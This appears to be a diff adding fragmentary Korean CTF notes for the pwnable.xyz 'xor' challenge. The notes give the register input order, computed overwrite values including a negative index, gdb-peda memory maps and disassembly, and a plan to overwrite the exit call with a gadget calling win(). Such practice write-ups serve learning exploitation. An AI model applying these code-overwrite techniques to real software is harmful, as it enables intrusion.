@@ -1,0 +1,70 @@
+ 1   2   3
+rcx rdx rax 순으로 입력받음
+
+
+ㄱ
+rdx = rax*8
+rax = rdx + 0x555555756200
+
+rax를 0x0000555555554ac8 만드는게 목표
+
+
+‭10995115839776
+1
+
+‭-1701236958269763440‬
+1
+
+
+
+[Write-Up]
+
+40691825832318185
+1
+-262887
+3번째 인자 : -262887
+
+0
+0
+0
+
+
+
+
+이를 통해 해당 부분 OVERWRITE
+
+gdb-peda$ vmmap
+
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555555000 rwxp	/home/superuser/Hacking-Problem/PWNABLEXYZ/xor/xor
+0x0000555555755000 0x0000555555756000 r--p	/home/superuser/Hacking-Problem/PWNABLEXYZ/xor/xor
+0x0000555555756000 0x0000555555757000 rw-p	/home/superuser/Hacking-Problem/PWNABLEXYZ/xor/xor
+0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
+0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fd7000 0x00007ffff7fda000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+해당 부분 Overwirte
+* 0x0000000000000ac8 <+148>:	call   0x830 <exit@plt>
+  0x0000000000000acd <+153>:	mov    rax,QWORD PTR [rbp-0x10]
+  0x0000000000000ad1 <+157>:	mov    rcx,QWORD PTR [rbp-0x20]
+  0x0000000000000ad5 <+161>:	mov    rdx,QWORD PTR [rbp-0x18]
+  0x0000000000000ad9 <+165>:	xor    rcx,rdx
+  0x0000000000000adc <+168>:	lea    rdx,[rax*8+0x0]
+  0x0000000000000ae4 <+176>:	lea    rax,[rip+0x201715]        # 0x202200 <result>
+
+
+
+Make Gadget  Call win() 
+
